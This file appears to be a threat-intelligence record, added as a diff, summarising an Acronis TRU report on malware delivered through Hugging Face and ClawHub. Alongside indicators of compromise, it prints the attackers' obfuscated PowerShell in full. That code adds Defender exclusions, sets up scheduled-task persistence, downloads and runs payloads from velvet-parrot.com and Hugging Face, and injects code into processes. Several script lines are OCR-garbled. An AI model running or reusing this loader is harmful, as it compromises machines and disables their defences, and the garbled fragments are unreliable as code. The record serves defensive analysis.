@@ -1,0 +1,128 @@
+title: Acronis TRU uncovered active abuse of AI platforms like Hugging Face and ClawHub
+  for malware delivery
+description: Acronis TRU identified threat activity abusing AI distribution platforms
+  such as Hugging Face and ClawHub to deliver malware disguised as models, datasets,
+  and agent extensions.
+attribution: ''
+malware_families:
+- trojan
+- cryptominer
+- AMOS stealer
+cves: []
+ttps:
+  processes:
+  - omni-agent-v4.exe
+  - microsoft-update-assist.exe
+  - svchost.exe
+  - RuntimeBroker.exe
+  - CDC1.bat
+  - vZJY8wQTBDxEtilj.bat
+  - msedge.exe
+  - chrome.exe
+  - firefox.exe
+  - powershell.exe
+  command_lines:
+  - Start-Process ($p1 + ('\svc'+'host.e'+'xe')) -WindowStyle Hidden
+  - Copy-Item ($p1 + ('\s'+'vcho'+'s'+'t.e'+'x'+'e')) "$p2t\RuntimeBroker.exe" -Force
+  - msedge.exe --headless --disable-gpu
+  - chrome.exe --headless --incognito
+  - firefox.exe --headless --disable-gpu
+  - powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABSAGEA...
+  powershell:
+  - $la=$env:LOCALAPPDATA;$p1=($la + ('\'+'Microsof'+'t\Office'+'B'+'rok'+'e'+'r'));$p2=($la
+    + ('\Packa'+'ges\M'+'icr'+'osof'+'t.Wi'+'n'+'dows.Peo'+'pleE'+'x'+'p'+'erience'+'Host_gw'+'1n1c2fh'+'ye'+'q'+'y'));$p2t=($p2
+    + (-join('\AC','\Te','mp')));New-Item -Path $p1 -ItemType Directory -Force|Out-Null;New-Item
+    -Path $p2t -ItemType Directory -Force|Out-Null;attrib +h +s $p1;attrib +h +s $p2;reg
+    add (-join('HK','LM','\S','OFTWARE\','Poli','cie','s\Micro','soft\Windo','ws Defen','der\Exc','lus','ions\Pa','t','hs'))
+    /f /reg:64;reg add (-join('H','KLM\SOFT','WARE','\Polic','ies\Micr','osoft\','Wind','ows
+    De','fende','r','\Exclusi','ons\','Paths')) /v $p1 /t REG_DWORD /d 0 /f /reg:64;reg
+    add (-join('HKLM\SOF','TW','ARE\P','olicies\','Micros','oft\Wind','ows De','fend','er','\Exclusi','ons','\Paths'))
+    /v $p2 /t REG_DWORD /d 0 /f /reg:64;try{Add-MpPreference -ExclusionPath $p1 -Force
+    -ErrorAction SilentlyContinue;Add-MpPreference -ExclusionPath $p2 -Force -ErrorAction
+    SilentlyContinue;}catch{}Start-Process gpupdate -ArgumentList '/force','/target:computer'
+    -WindowStyle Hidden -Wait 2>$null;Start-Sleep -Seconds 20;schtasks /create /tn
+    ('Windows'+'S'+'ystemSe'+'rvice') /tr ($p1 + (-join('\','svch','ost.e','xe')))
+    /sc onlogon /rl highest /f 2>$null;schtasks /create /tn ('Runt'+'imeBrok'+'e'+'rSe'+'rvi'+'c'+'e')
+    /tr ($p2t + '\RuntimeBroker.exe -Embedding') /sc onlogon /rl highest /f 2>$null;[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$iv=New-Object
+    byte[] 16;[Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($iv);$aes=[Security.Cryptography.Aes]::Create();$aes.Key=[Text.Encoding]::UTF8.GetBytes(('4171'+'29612949'+'11411673'+'08'+'91673399'+'01'));$aes.IV=$iv;$aes.Mode=(-join('CB','C'));$aes.Padding=('PK'+'CS'+'7');$cmd=[Text.Encoding]::UTF8.GetBytes((-join('ge','tP','aylo','a','d')));$encCmd=$aes.CreateEncryptor().TransformFinalBlock($cmd,0,$cmd.Length);$body=New-Object
+    byte[] ($iv.Length+$encCmd.Length);[Array]::Copy($iv,$body,16);[Array]::Copy($encCmd,0,$body,16,$encCmd.Length);$wc=New-Object
+    Net.WebClient;$wc.Headers.Add((-join('C','onten','t-Ty','pe')),('app'+'lic'+'ation'+'/octet-s'+'tre'+'am'));$data=$wc.UploadData('https://velvet-parrot.com:443',$body);$riv=[byte[]]$data[0..15];$enc=[byte[]]$data[16..($data.Length-1)];$aes.IV=$riv;$dec=$aes.CreateDecryptor().TransformFinalBlock($enc,0,$enc.Length);[IO.File]::WriteAllBytes(($p1
+    + ('\svc'+'host.e'+'xe')),$dec);Copy-Item ($p1 + ('\s'+'vcho'+'s'+'t.e'+'x'+'e'))
+    "$p2t\RuntimeBroker.exe" -Force;Start-Process ($p1 + ('\svc'+'host.e'+'xe')) -WindowStyle
+    Hidden
+  - '{[Text.Encoding]::UTF8.GetString(...)}'
+  - $ErrorActionPreference = 'SilentlyContinue'
+  - $exeUrl = "http://huggingface.co/datasets/ithkr/Base-VectorDB-RAG/resolve/main/omni-agent-v4.exe"
+  - $exePath = "$env:TEMP\microsoft-update-assist.exe"
+  - $decoyUrl = "https://huggingface.co/datasets/ithkr/Base-VectorDB-RAG/resolve/main/catcat.webp"
+  - Start-Process $decoyUrl
+  - Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UserAgent "Mozilla/5.0"
+  - Start-Process -FilePath $exePath -WindowStyle Hidden
+  - $0 = $env:TEMP;$x = $0 + '\x.bat';$h = 'https';$d = 'huggingface.co';$r = '/217}732dd1/gjanAud46d9UnOhTHBI
+    TRcnmzBq j uMhaKFwpgFqUjUZTRyXypqF ] 7jD7Fymp2nnPgaktBra4doTplopkx662Ge3s2yKEJ3/raw/main/xt53.bat';&
+    ((gal *w[*r]).Definition) ($h + '://' + $d + ':' + $r) -OutFile $x;& ((gem strr[*t]).Definition)
+    -FilePath ($env:ComSpec) -Argumentlist "/c "$x"
+  - try { Scantnt - Gt-Gontnt -LisratPah 1o Errarciion Stops . (Eomert Lotih - romy
+    g bOSHA S L35 20511 1)iten et EnctnaUTFS st Sysen Eomere Lt ambasehSe tsestent
+    1)) | ot-Fil[RESEHES A R
+  - ceo+:rusydbgly8LXXbkz2 <encoded_payload>
+  - $smutex = [System.Threading.Mutex] ::0penExts ting(snutextiane)exit) cateh Smutex
+    = Hew-bject Systen. Threading utex($false, $autexiase))
+  - Sprocess = Get-Process -Nane explorer ~ErrorAction SilentlyContinuei (-not sprocess)
+    {start-Sleep -seconds 4Sprocess = GetProcess -Mane explorer ~Errorfction SilentlyContinueF
+    (-not sprocess)
+  - $p = sprocess(o]. 1U (-not $p -or Sprocess(o) HasExtted) )
+  - eoSuatchdogprocess = Get-process -Nase svchost ~ErrorAction StlentlyContinue |
+    Select-Object -First 1i (svatehdogprocess) {Sup = Saatchdogprocess. 1dsihlte (strue)
+    Start-Stecp ~Seconds 8try Scheckprocess = Get-process -1d $p -Erraraction stlentlyContinveU
+    (ot Scheckpracess -or ScheckProcess. Hasexited)
+  - 'Snesrocess = Get_process -tome explorer -Erroraction StlentlyContinue{F (sneuprocess)
+    3~ Snevprocess(6].1d{7 (vt sp -or sneirocess o] Hastxited) continie3Stp = [Hankahool
+    : :0perProcess(spf, Sfatse, $p)U (3hp -eq (tper]:zero)Continie)520 = [Hankahoo)
+    Vi talAUOCEX($1p, [TntPtr::Zero, $uas_GTVI2K) Length, Sec, $prv)U (524 eq [Intptr]:
+    Zera) {)$5c = [Hznkahoo i tePracessesory(hp, $ad, $uss_GTY32X], $uas_G7132X) Length,[Intrer]:zero)o
+    ot $sc) continue)Sth = [Hankahoo : CreateRepoteThread(hp, (IntPtr]::Zero, 0, $ad,
+    [Intptr):izero, o,[Intpr]:zero)U5 (5th eq (Intper]: zero) continie)Start-Steep
+    -Milliseconds 593'
+  scripts: []
+  registry_keys:
+  - HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths
+  image_loads: []
+  network_connections:
+  - /bin/bash -> hxxp://91.92.242[.]30/6wioz8285kcbax6v
+  - curl -> hxxp://91.92.242[.]30/1v07y9e1m6v7thl6
+  - https://velvet-parrot.com:443
+  - powershell.exe -> huggingface.co:80
+  - powershell.exe -> huggingface.co:443
+  file_activity:
+  - ClawHub-DependencyInstaller.zip
+  - $TMPDIR/1v07y9e1m6v7thl6
+  - '%APPDATA%/Microsof''t\Office''B''rok''e''r/svchost.exe'
+  - '%APPDATA%/Packa''ges\Micr''osof''t.Wi''n''dows.Peo''pleE''x''p''erience''Host_gw''1n1c2fh''ye''q''+''y/AC\Te''mp/RuntimeBroker.exe'
+  - $env:TEMP\microsoft-update-assist.exe
+  - $env:TEMP\x.bat
+  persistence:
+  - Registry exclusions for %APPDATA%/Microsof't\Office'B'rok'e'r and %APPDATA%/Packa'ges\Micr'osof't.Wi'n'dows.Peo'pleE'x'p'erience'Host_gw'1n1c2fh'ye'q'+'y
+  - Scheduled tasks to launch malware on login
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses:
+  - 91.92.242[.]30
+  domains:
+  - install[.]app-distribution[.]net
+  - velvet-parrot[.]com
+  - huggingface.co
+  urls:
+  - hxxp://91.92.242[.]30/6wioz8285kcbax6v
+  - hxxp://91.92.242[.]30/1v07y9e1m6v7thl6
+  - hxxps://velvet-parrot[.]com:443
+  - http://huggingface.co/datasets/ithkr/Base-VectorDB-RAG/resolve/main/omni-agent-v4.exe
+  - https://huggingface.co/datasets/ithkr/Base-VectorDB-RAG/resolve/main/catcat.webp
+authors:
+- Darrel Virtusio
+- Subhajeet Singha
+- Syed Aizad
+reference: https://www.acronis.com/en/tru/posts/poisoning-the-well-ai-supply-chain-attacks-on-hugging-face-and-openclaw/
+date_of_publication: May 01, 2026
+file_creation_date: May 01, 2026
